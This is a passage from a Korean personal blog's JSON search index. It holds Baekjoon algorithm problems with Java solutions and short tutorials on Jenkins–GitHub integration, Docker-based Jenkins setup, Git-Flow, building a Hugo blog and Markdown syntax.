자연수 N과 M이 주어진다. (1 ≤ M ≤ N ≤ 7)\n [출력]  한 줄에 하나씩 문제의 조건을 만족하는 수열을 출력한다. 중복되는 수열을 여러 번 출력하면 안되며, 각 수열은 공백으로 구분해서 출력해야 한다. 수열은 사전 순으로 증가하는 순서로 출력해야 한다.\n [소스] import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.StringTokenizer; public class Main { static int N,M; static int[] ans; static StringBuilder sb = new StringBuilder(); public static void main(String[] args) throws IOException{ BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); N=Integer.parseInt(stk.nextToken()); M=Integer.parseInt(stk.nextToken()); ans=new int[M]; go(0); System.out.println(sb); } static void go(int depth) { if(depth==M) { for(int tmp:ans) sb.append((tmp+1)+\u0026#34; \u0026#34;); sb.append(\u0026#39;\\n\u0026#39;); return; } for(int i=0;i\u0026lt;N;i++) { ans[depth]=i; go(depth+1); } } } 문제링크 https://www.acmicpc.net/problem/15651\n","date":"2021-08-08T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15651-n%EA%B3%BC-m-3/","title":"백준 15651 N과 M (3)"},{"content":"[문제]  자연수 N과 M이 주어졌을 때, 아래 조건을 만족하는 길이가 M인 수열을 모두 구하는 프로그램을 작성하시오. 1부터 N까지 자연수 중에서 중복 없이 M개를 고른 수열 고른 수열은 오름차순이어야 한다.\n [입력]  첫째 줄에 자연수 N과 M이 주어진다. (1 ≤ M ≤ N ≤ 8)\n [출력]  한 줄에 하나씩 문제의 조건을 만족하는 수열을 출력한다. 중복되는 수열을 여러 번 출력하면 안되며, 각 수열은 공백으로 구분해서 출력해야 한다. 수열은 사전 순으로 증가하는 순서로 출력해야 한다.\n [소스] import java.util.Scanner; public class Main{ static int N,M; static int[] arr; static boolean[] visited; public static void main(String args[]){ Scanner sc = new Scanner(System.in); N=sc.nextInt(); M=sc.nextInt(); arr=new int[M]; visited=new boolean[N+1]; go(1,0); } static void go(int c, int depth){ if(M==depth){ for(int ans:arr){ System.out.print(ans+ \u0026#34; \u0026#34;); } System.out.println(); return; } for(int i=c;i\u0026lt;=N;i++){ if(!visited[i]){ visited[i]=true; arr[depth]=i; go(i+1,depth+1); visited[i]=false; } } } } 문제링크 https://www.acmicpc.net/problem/15650\n","date":"2021-08-06T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15650-n%EA%B3%BC-m-2/","title":"백준 15650 N과 M (2)"},{"content":"[문제]  자연수 N과 M이 주어졌을 때, 아래 조건을 만족하는 길이가 M인 수열을 모두 구하는 프로그램을 작성하시오. 1부터 N까지 자연수 중에서 중복 없이 M개를 고른 수열\n [입력]  첫째 줄에 자연수 N과 M이 주어진다. (1 ≤ M ≤ N ≤ 8)\n [출력]  한 줄에 하나씩 문제의 조건을 만족하는 수열을 출력한다. 중복되는 수열을 여러 번 출력하면 안되며, 각 수열은 공백으로 구분해서 출력해야 한다. 수열은 사전 순으로 증가하는 순서로 출력해야 한다.\n [소스] import java.util.Scanner; public class boj15649 { static int N,M; static int[] arr,visited; public static void main(String[] args) { Scanner sc = new Scanner(System.in); N=sc.nextInt(); M=sc.nextInt(); arr=new int[M]; visited=new int[N]; go(0); } static void go(int depth) { if(M==depth) { for(int ans:arr) System.out.print(ans+1+ \u0026#34; \u0026#34;); System.out.println(); return; } for(int i=0;i\u0026lt;N;i++) { if(visited[i]!=1) { visited[i]=1; arr[depth]=i; go(depth+1); visited[i]=0; } } } } 문제링크 https://www.acmicpc.net/problem/15649\n","date":"2021-08-05T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15649-n%EA%B3%BC-m-1/","title":"백준 15649 N과 M (1)"},{"content":"[문제]  N개의 정수가 주어진다. 이때, 최솟값과 최댓값을 구하는 프로그램을 작성하시오.\n [입력]  첫째 줄에 정수의 개수 N (1 ≤ N ≤ 1,000,000)이 주어진다. 둘째 줄에는 N개의 정수를 공백으로 구분해서 주어진다. 모든 정수는 -1,000,000보다 크거나 같고, 1,000,000보다 작거나 같은 정수이다.\n [출력]  첫째 줄에 주어진 정수 N개의 최솟값과 최댓값을 공백으로 구분해 출력한다.\n [소스] import java.util.Scanner; public class boj10818{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int mn=1000000; int mx=-1000000; int N=sc.nextInt(); for(int i=0;i\u0026lt;N;i++){ int tmp = sc.nextInt(); if(mn\u0026gt;tmp) mn=tmp; if(mx\u0026lt;tmp) mx=tmp; } System.out.println(mn+\u0026#34; \u0026#34;+mx); } } 문제링크 https://www.acmicpc.net/problem/10818\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-10818-%EC%B5%9C%EC%86%8C-%EC%B5%9C%EB%8C%80/","title":"백준 10818 최소, 최대"},{"content":"[문제]  두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n [입력]  입력은 여러 개의 테스트 케이스로 이루어져 있다. 각 테스트 케이스는 한 줄로 이루어져 있으며, 각 줄에 A와 B가 주어진다. (0 \u0026lt; A, B \u0026lt; 10)\n [출력]  각 테스트 케이스마다 A+B를 출력한다.\n [소스] import java.util.Scanner; public class boj10951 { public static void main(String args[]){ Scanner sc=new Scanner(System.in); while(sc.hasNextInt()) System.out.println((sc.nextInt()+sc.nextInt())); } } 문제링크 https://www.acmicpc.net/problem/10951\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-10951-a-b-4/","title":"백준 10951 A+B - 4"},{"content":"[문제]  두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n [입력]  첫째 줄에 테스트 케이스의 개수 T가 주어진다. 각 테스트 케이스는 한 줄로 이루어져 있으며, 각 줄에 A와 B가 주어진다. (0 \u0026lt; A, B \u0026lt; 10)\n [출력]  각 테스트 케이스마다 \u0026ldquo;Case #x: \u0026ldquo;를 출력한 다음, A+B를 출력한다. 테스트 케이스 번호는 1부터 시작한다.\n [소스] import java.util.Scanner; public class boj11021{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int T=sc.nextInt(); for(int i=1;i\u0026lt;=T;i++) System.out.println(\u0026#34;Case #\u0026#34;+i+\u0026#34;: \u0026#34;+(sc.nextInt()+sc.nextInt())); } } 문제링크 https://www.acmicpc.net/problem/11021\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-11021-a-b-7/","title":"백준 11021 A+B - 7"},{"content":"[문제]  두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n [입력]  첫째 줄에 테스트 케이스의 개수 T가 주어진다. 각 테스트 케이스는 한 줄로 이루어져 있으며, 각 줄에 A와 B가 주어진다. (0 \u0026lt; A, B \u0026lt; 10)\n [출력]  각 테스트 케이스마다 \u0026ldquo;Case #x: A + B = C\u0026rdquo; 형식으로 출력한다. x는 테스트 케이스 번호이고 1부터 시작하며, C는 A+B이다.\n [소스] import java.util.Scanner; public class boj11022{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int T=sc.nextInt(); for(int i=1;i\u0026lt;=T;i++){ int A = sc.nextInt(); int B = sc.nextInt(); System.out.println(\u0026#34;Case #\u0026#34;+i+\u0026#34;: \u0026#34;+A+\u0026#34; + \u0026#34;+B+\u0026#34; = \u0026#34;+(A+B)); } } 문제링크 https://www.acmicpc.net/problem/11022\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-11022-a-b-8/","title":"백준 11022 A+B - 8"},{"content":"[문제]  흔한 수학 문제 중 하나는 주어진 점이 어느 사분면에 속하는지 알아내는 것이다. 사분면은 아래 그림처럼 1부터 4까지 번호를 갖는다. \u0026ldquo;Quadrant n\u0026quot;은 \u0026ldquo;제n사분면\u0026quot;이라는 뜻이다.\n  예를 들어, 좌표가 (12, 5)인 점 A는 x좌표와 y좌표가 모두 양수이므로 제1사분면에 속한다. 점 B는 x좌표가 음수이고 y좌표가 양수이므로 제2사분면에 속한다.\n  점의 좌표를 입력받아 그 점이 어느 사분면에 속하는지 알아내는 프로그램을 작성하시오. 단, x좌표와 y좌표는 모두 양수나 음수라고 가정한다.\n [입력]  첫 줄에는 정수 x가 주어진다. (−1000 ≤ x ≤ 1000; x ≠ 0) 다음 줄에는 정수 y가 주어진다. (−1000 ≤ y ≤ 1000; y ≠ 0)\n [출력]  점 (x, y)의 사분면 번호(1, 2, 3, 4 중 하나)를 출력한다.\n [소스] import java.util.Scanner; public class boj14681{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int x = sc.nextInt(); int y = sc.nextInt(); if(x\u0026gt;0) System.out.println(y\u0026gt;0?1:4); else System.out.println(y\u0026gt;0?2:3); } } 문제링크 https://www.acmicpc.net/problem/14681\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-14681-%EC%82%AC%EB%B6%84%EB%A9%B4-%EA%B3%A0%EB%A5%B4%EA%B8%B0/","title":"백준 14681 사분면 고르기"},{"content":"[문제]  연도가 주어졌을 때, 윤년이면 1, 아니면 0을 출력하는 프로그램을 작성하시오. 윤년은 연도가 4의 배수이면서, 100의 배수가 아닐 때 또는 400의 배수일 때이다. 예를 들어, 2012년은 4의 배수이면서 100의 배수가 아니라서 윤년이다. 1900년은 100의 배수이고 400의 배수는 아니기 때문에 윤년이 아니다. 하지만, 2000년은 400의 배수이기 때문에 윤년이다.\n [입력]  첫째 줄에 연도가 주어진다. 연도는 1보다 크거나 같고, 4000보다 작거나 같은 자연수이다\n [출력]  첫째 줄에 윤년이면 1, 아니면 0을 출력한다.\n [소스] import java.util.Scanner; public class boj2753{ public static void Main(String[] args){ Scanner sc = new Scanner(System.in);\tint yy=sc.nextInt(); if(yy%4==0) if(yy%100!=0|yy%400==0) System.out.println(1); else System.out.println(0); else System.out.println(0); } } 문제링크 https://www.acmicpc.net/problem/2753\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2753-%EC%9C%A4%EB%85%84/","title":"백준 2753 윤년"},{"content":"[문제]  상근이는 매일 아침 알람을 듣고 일어난다. 알람을 듣고 바로 일어나면 다행이겠지만, 항상 조금만 더 자려는 마음 때문에 매일 학교를 지각하고 있다. 상근이는 모든 방법을 동원해보았지만, 조금만 더 자려는 마음은 그 어떤 것도 없앨 수가 없었다. 이런 상근이를 불쌍하게 보던, 창영이는 자신이 사용하는 방법을 추천해 주었다. 바로 \u0026ldquo;45분 일찍 알람 설정하기\u0026quot;이다. 이 방법은 단순하다. 원래 설정되어 있는 알람을 45분 앞서는 시간으로 바꾸는 것이다. 어차피 알람 소리를 들으면, 알람을 끄고 조금 더 잘 것이기 때문이다. 이 방법을 사용하면, 매일 아침 더 잤다는 기분을 느낄 수 있고, 학교도 지각하지 않게 된다. 현재 상근이가 설정한 알람 시각이 주어졌을 때, 창영이의 방법을 사용한다면, 이를 언제로 고쳐야 하는지 구하는 프로그램을 작성하시오.\n [입력]  첫째 줄에 두 정수 H와 M이 주어진다. (0 ≤ H ≤ 23, 0 ≤ M ≤ 59) 그리고 이것은 현재 상근이가 설정한 놓은 알람 시간 H시 M분을 의미한다. 입력 시간은 24시간 표현을 사용한다. 24시간 표현에서 하루의 시작은 0:0(자정)이고, 끝은 23:59(다음날 자정 1분 전)이다. 시간을 나타낼 때, 불필요한 0은 사용하지 않는다.\n [출력]  첫째 줄에 상근이가 창영이의 방법을 사용할 때, 설정해야 하는 알람 시간을 출력한다. (입력과 같은 형태로 출력하면 된다.)\n [소스] import java.util.Scanner; public class boj2884{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int H = sc.nextInt(); int M = sc.nextInt()-45; if(M\u0026lt;0){ H--; M+=60; } if(H\u0026lt;0)H=23; System.out.println(H+\u0026#34; \u0026#34;+M); } } 문제링크 https://www.acmicpc.net/problem/2884\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2884-%EC%95%8C%EB%9E%8C-%EC%8B%9C%EA%B3%84/","title":"백준 2884 알람 시계"},{"content":"[문제]  간선에 가중치와 방향성이 없는 임의의 루트 있는 트리가 주어졌을 때, 아래의 쿼리에 답해보도록 하자. 정점 U를 루트로 하는 서브트리에 속한 정점의 수를 출력한다. 만약 이 문제를 해결하는 데에 어려움이 있다면, 하단의 힌트에 첨부한 문서를 참고하자.\n [입력]  트리의 정점의 수 N과 루트의 번호 R, 쿼리의 수 Q가 주어진다. (2 ≤ N ≤ 105, 1 ≤ R ≤ N, 1 ≤ Q ≤ 105)이어 N-1줄에 걸쳐, U V의 형태로 트리에 속한 간선의 정보가 주어진다. (1 ≤ U, V ≤ N, U ≠ V)이는 U와 V를 양 끝점으로 하는 간선이 트리에 속함을 의미한다.이어 Q줄에 걸쳐, 문제에 설명한 U가 하나씩 주어진다. (1 ≤ U ≤ N)입력으로 주어지는 트리는 항상 올바른 트리임이 보장된다.\n [출력]  Q줄에 걸쳐 각 쿼리의 답을 정수 하나로 출력한다.\n [소스] import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.ArrayList; import java.util.List; import java.util.StringTokenizer; public class boj15681 { static List\u0026lt;Integer\u0026gt;[] list, tree; static int parent[],size[]; public static void main(String[] args) throws IOException { BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); int N = Integer.parseInt(stk.nextToken()); // 정점의 수 \tint R = Integer.parseInt(stk.nextToken()); // 루트의 번호 \tint Q = Integer.parseInt(stk.nextToken()); // 쿼리의 수  list = new ArrayList[N+1]; tree = new ArrayList[N+1]; parent = new int[N+1]; size = new int [N+1]; for(int i=0;i\u0026lt;list.length;i++) { list[i]=new ArrayList\u0026lt;\u0026gt;(); tree[i]=new ArrayList\u0026lt;\u0026gt;(); } for(int i=0;i\u0026lt;N-1;i++) { stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); int U = Integer.parseInt(stk.nextToken()); int V = Integer.parseInt(stk.nextToken()); list[U].add(V); list[V].add(U); } makeTree(R,-1); // 트리생성 \tcountSubtreeNodes(R); for(int i=0;i\u0026lt;Q;i++) { int query = Integer.parseInt(br.readLine()); System.out.println(size[query]); } } public static void makeTree(int currentNode, int parentNode) { for(int node : list[currentNode]) { if(node!=parentNode) { tree[currentNode].add(node); parent[node] = currentNode; makeTree(node, currentNode); } } } public static void countSubtreeNodes(int currentNode) { size[currentNode]=1; for(int node : tree[currentNode]) { countSubtreeNodes(node); size[currentNode]+=size[node]; } } } 문제링크 https://www.acmicpc.net/problem/15681\n","date":"2021-08-02T20:45:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15681-%ED%8A%B8%EB%A6%AC%EC%99%80-%EC%BF%BC%EB%A6%AC/","title":"백준 15681 트리와 쿼리"},{"content":"프로젝트에 Jenkins를 적용하면서 정리함\n1. Personal access Token 발급  Github 접속 후 프로필 클릭 [setting] - [Developer settings] 선택   Jenkins \n  [Personal access tokens] - [Generate new token] 클릭  Jenkins \n  토큰 명 입력\n  토큰에서 사용할 기능 선택 후 [Generate token] 클릭\n   Jenkins \n※ 아래 토큰은 나중에 다시확인 못하니 메모해야함!\n Jenkins \n2. Jenkins에 토큰 등록  Jenkins 접속 후 [Jenkins 관리] - [시스템 설정] 선택   Jenkins \n Github Server 설정에서 [Add Github Server] - [Add] 클릭   Jenkins \n 아까 메모 해둔 Token을 [Secret]에 등록, [ID]에 토큰을 구분할 이름 작성 후 [Add]클릭   Jenkins \n3. 프로젝트 생성   [Freestyle Project] 선택  Jenkins \n  General에서 [Github Project]선택 후 Github 주소 입력 ※ .git 까지 입력해야함 !\n   Jenkins \n 소스 코드 관리에서 [Git] 선택 후 Git주소를 [Repository URL]에 입력  ※ .git 까지 입력해야함 !\n Credentials 등록 위해 [Add] 클릭   Jenkins \n Kind에 [Username with Password] 선택 Username에 Github ID 작성 Password에 Github Password 작성 후 Add클릭   Jenkins \n 빌드 유발에서 [Github hook trggier for GITScm polling] 선택 후 프로젝트를 저장   Jenkins \n4. Github Webhook 설정   Webhooks를 설정 할 Project에서 [Setting]-[Webhooks]-[Add Webhook] 선택  Jenkins \n  Payload URL에 [Jenkins주소+/github-webhook/] 입력\n  Content type에 [application/json] 선택\n  Webhook 걸 이벤트 선택 후 [Add Webhook] 선택\n  아래 사진은 이미 등록이 되어있어서 update로 표시됨\n   Jenkins \n","date":"2021-04-24T22:06:22+09:00","permalink":"https://appealso.github.io/p/jenkins-github-%EC%97%B0%EB%8F%99-%EB%B0%A9%EB%B2%95/","title":"Jenkins + Github 연동 방법"},{"content":"Jenkins와 Github을 연동하면서 정리함\n1. 젠킨스 이미지 다운로드 % docker pull jenkins/jenkins:lts2. 젠킨스 실행 % docker run -p 8080:8080 -p 50000:50000 -v /#(your_home):/var/jenkins_home --name jenkins jenkins/jenkins:lts# -p\t호스트와 컨테이너의 포트를 연결 (포워딩)# -v\t호스트와 컨테이너의 디렉토리를 연결 (마운트)# --name container 이름 지정3. 젠킨스 설치 (1) 비밀번호 입력  Docker \n(2) Install suggested plugins선택  Docker \n(3) 설치 진행  Docker \n(4) 계정 설정  Docker \n(5) 설치 완료  Docker \n","date":"2021-04-24T21:10:40+09:00","permalink":"https://appealso.github.io/p/docker%ED%86%B5%ED%95%9C-%EC%A0%A0%ED%82%A8%EC%8A%A4jenkins-%EC%84%A4%EC%B9%98/","title":"Docker통한 젠킨스(Jenkins) 설치 "},{"content":"프로젝트 형상 관리에 Git-Flow를 적용하기 위해 정리 함\nBranch 종류  Git-Flow \nGit-Flow는 5가지 브랜치를 사용 1. master  유지 브랜치 실제 프로그램이 배포되는 브랜치 (Production (운영 Branch))  2. develop  유지 브랜치 개발 브랜치 (Develop(개발 Branch)) 개발 완료 후 release 브랜치에 merge  3. release  유지 브랜치 QA 테스트 브랜치 (Staging (품질 테스트 Branch)) 테스트 완료 후 master 브랜치에 merge  4. feature  보조 브랜치 기능 개발 브랜치 (실제 개발) 일정에 맞춰 develop에 merge 및 해당 브랜치 삭제  5. hotfix  보조 브랜치 긴급 오류 해결을 위한 브랜치 (운영 버그 수정) 오류 수정 후 master에 merge 및 해당 브랜치 삭제  Git flow 설치하기 $ brew install git-flow-avh 초기화 $ git flow init 메인 브랜치  Git-Flow \n1. materst branch  origin/master에 두고 관리 master 브랜치에 merge는 새로운 버전을 의미  2. develop branch # -d를 붙이면 develop이라는 브랜치 생성 됨 $ git flow init -d  origin/develop에 두고 관리 개발자들이 개발한 소스를 반영하는 브랜치 develop 브랜치는 master에서 파생됨 release (QA 브랜치)를 사용하지 않을 경우 master에 merge하고 배포 버전으로 태그를 담  보조 브랜치  Git-Flow \n1. feature 브랜치  develop에서 파생된 브랜치 개발 완료 후 develop 브랜치에 merge  # 새 기능 개발 시작 $ git flow feature start 브랜치명 # 새 기능 개발 완료 $ git flow feature finish 브랜치명 # 새 기능 게시 $ git flow feature publish 브랜치명 # 게시된 기능 가져오기 $ git flow feature pull origin 브랜치명  Git-Flow \n2. release 브랜치  develop에서 파생된 브랜치 master에 merge하기 전 테스트 진행 release 브랜치에서는 기능 개발은 X 버그 수정 및 출시 준비 작업만 수행 완료되면 master와 develop에 merge 수행  # 릴리즈 시작 $ git flow release start 버전 # 릴리즈 완료 $ git flow release finish 버전 # 태그 푸시 $ git push --tags  Git-Flow \n3. hotfix 브랜치  master에서 파생된 브랜치 master에 배포한 제품에 버그를 즉각 대응할 때 생성 버그 수정 후 master와 develop에 merge 수행  # 핫 픽스 시작 $ git flow hotfix start 버전 [BASENAME] # 핫 픽스 완료 $ git flow hotfix finish 버전 참고 https://dahye-jeong.gitbook.io/git/git/2019-01-27-git-flow?\nhttps://88240.tistory.com/489\nhttps://danielkummer.github.io/git-flow-cheatsheet/index.ko_KR.html#comment-4550019179?\nhttps://nvie.com/posts/a-successful-git-branching-model/\n","date":"2021-04-24T18:51:40+09:00","permalink":"https://appealso.github.io/p/git-flow-%EC%A0%95%EB%A6%AC/","title":"Git-Flow 정리"},{"content":"GithubIO와 hugo theme을 적용하면서 정리함\n1. hugo 설치 % brew isntall hugo % hugo version // 휴고 버전 확인 2. Directory 구성 ├── archetypes ├── config.toml //hugo theme 설정파일 ├── content // post 저장 위치 ├── data ├── layouts ├── static //image 저장 위치 인듯...? └── themes // 테마 저장 폴더 3. hugo로 웹 사이트 생성 \u0026amp; 테마 다운로드 % hugo new site \u0026lt;hugo디렉토리명\u0026gt; % cd theme \u0026lt;hugo디렉토리명\u0026gt;/themes % git submodule add \u0026lt;테마git 주소\u0026gt; \u0026lt;테마명\u0026gt; 테마다운로드주소 : https://themes.gohugo.io\n4. hugo 테마 적용 hugo 테마는 github repository가 2개 필요함. hugo 설정파일 repository와 실제 사이트 repository 두개를 생성해야함.\n% cd \u0026lt;hugo디렉토리명\u0026gt; \u0026lt;hugo디렉토리명\u0026gt; % git init \u0026lt;hugo디렉토리명\u0026gt; % git remote add origin \u0026lt;hugo repository 주소\u0026gt; \u0026lt;hugo디렉토리명\u0026gt; % git submodule add -b master \u0026lt;github.io repository 주소\u0026gt; public //실제 사이트는 public 폴더에서 볼 수 있음. \u0026lt;hugo디렉토리명\u0026gt; % hugo -t \u0026lt;테마명\u0026gt; 5. config.toml 설정 % vi config.toml theme = \u0026quot;테마명\u0026quot; //적용할 테마명을 넣는다.(필수!!) // 나머지 설정은 테마에 따라 설정이 달라진다. // theme에 저장한 theme의 config.toml을 참조해서 수정하면 될 듯 하다. 6. 글작성 % hugo new \u0026lt;폴더명\u0026gt;/[md파일명].md //content/\u0026lt;폴더명\u0026gt;/[md파일명].md 에 파일 생성 됨. % vi content/\u0026lt;폴더명\u0026gt;/[md파일명].md //글 쓰기 % hugo -D //static 파일을 생성한다. md파일을 명령어 실행 후 아래와 같이 파일 내용이 작성된다. categories,tags는 원할 경우 아래와 같이 추가해서 사용해야함.\n  -\u0026ndash;\ntitle: \u0026ldquo;제목\u0026rdquo;\ndate: 날짜\ndraft: true // false는 비공개 글.\ncategories: [\u0026ldquo;category명\u0026rdquo;]\ntags: [\u0026ldquo;tag명\u0026rdquo;]\n-\u0026ndash;\n  7. hugo git에 반영 아래 명령어 순서대로 입력\n\u0026lt;hugo디렉토리명\u0026gt; % hugo -t soho \u0026lt;hugo디렉토리명\u0026gt; % hugo -D \u0026lt;hugo디렉토리명\u0026gt; % cd ./public \u0026lt;hugo디렉토리명\u0026gt;/public % git add . \u0026lt;hugo디렉토리명\u0026gt;/public % git commit -m \u0026quot;$msg\u0026quot; \u0026lt;hugo디렉토리명\u0026gt;/public % git push origin master \u0026lt;hugo디렉토리명\u0026gt;/public % cd .. \u0026lt;hugo디렉토리명\u0026gt; % git add . \u0026lt;hugo디렉토리명\u0026gt; % git commit -m \u0026quot;$msg\u0026quot; \u0026lt;hugo디렉토리명\u0026gt; % git push origin master 8. Disqus Comment 추가하기 8.1 Disqus 가입 후 Setting 클릭  Disqus \n8.2 Profile, Account 작성  Disqus \n8.3 Home으로 이동 후 Get Started 클릭  Disqus \n8.4 I want to install Disqus on my site 클릭  Disqus \n8.5 Create a new site 작성  Disqus \n8.6 화면을 조금 내리서 Basic에 Subscribe Now 클릭(돈많으면\u0026hellip;돈내고쓰세요\u0026hellip;ㅠㅠ)  Disqus \n8.7 화면을 조금 내려서 아래 버튼 클릭(hugo는 지원목록에 없다. 추가될수도..?) ![Disqus](https://github.com/Appealso/Appealso.github.io/blob/master/images/disqus/Disqu 8.png?raw=true)\n8.8 configure 클릭  Disqus \n8.9 사이트 정보 기입  Disqus \n8.10 완료!  Disqus \n8.11 config.toml 수정 % vi config.toml disqusShortname = \u0026quot;\u0026lt;Disqus shortname\u0026gt;\u0026quot; 8.11.1 short name 확인방법  Disqus \n Disqus \n 수정중\u0026hellip;20.12.21 ~ ing\n","date":"2020-12-21T20:45:37+09:00","permalink":"https://appealso.github.io/p/githubio-hugo-theme-blog-%EA%B5%AC%EC%B6%95%EA%B8%B0./","title":"Githubio+hugo Theme Blog 구축기."},{"content":"Mark Down의 기본 문법을 정리\n1. 제목 # h1제목 ## h2제목 ### h3제목 #### h4제목 ##### h5제목 ###### h6제목 h1제목 h2제목 h3제목 h4제목 h5제목 h6제목  2. 수평선 * * * *** _ _ _ ---  3. 글자강조 **굵게** __이탤릭__ ~~취소선~~ 굵게\n이탤릭\n취소선\n 4. 인용문 \u0026gt;첫번째 \u0026gt;\u0026gt;두번째 \u0026gt;\u0026gt;\u0026gt;세번째  첫번째 인용문\n 두번째 인용문\n 세번째 인용문\n  다시 첫번째\n  5. 이미지 ![이미지이름](이미지 주소)  달려라춘식! \n 6.글자색 \u0026lt;span style=\u0026quot;color:red\u0026quot;\u0026gt;붉은 색\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026quot;color:blue\u0026quot;\u0026gt;파란 색\u0026lt;/span\u0026gt; 붉은 색파란 색 7. 마크다운 이스케이프 \\*\\*강조\\*\\* **강조**\n 8.코여블록  ```언어이름소문자\npublic static void main(String[] args){\nSystem.out.println(\u0026ldquo;Hello Wolrd\u0026rdquo;);\n}\n```\n public static void main(String[] args){ System.out.println(\u0026#34;Hello Wolrd\u0026#34;); }  9.링크 \u0026lt;링크주소\u0026gt; ex) \u0026lt;https://www.naver.com\u0026gt; [링크명](링크주소) ex) [네이버](https://www.naver.com) https://www.naver.com\n네이버\n 수정중ㅎㅎ","date":"2020-12-20T20:19:13+09:00","permalink":"https://appealso.github.io/p/%EB%A7%88%ED%81%AC%EB%8B%A4%EC%9A%B4-%EC%9E%91%EC%84%B1%EB%B2%95/","title":"마크다운 작성법"}]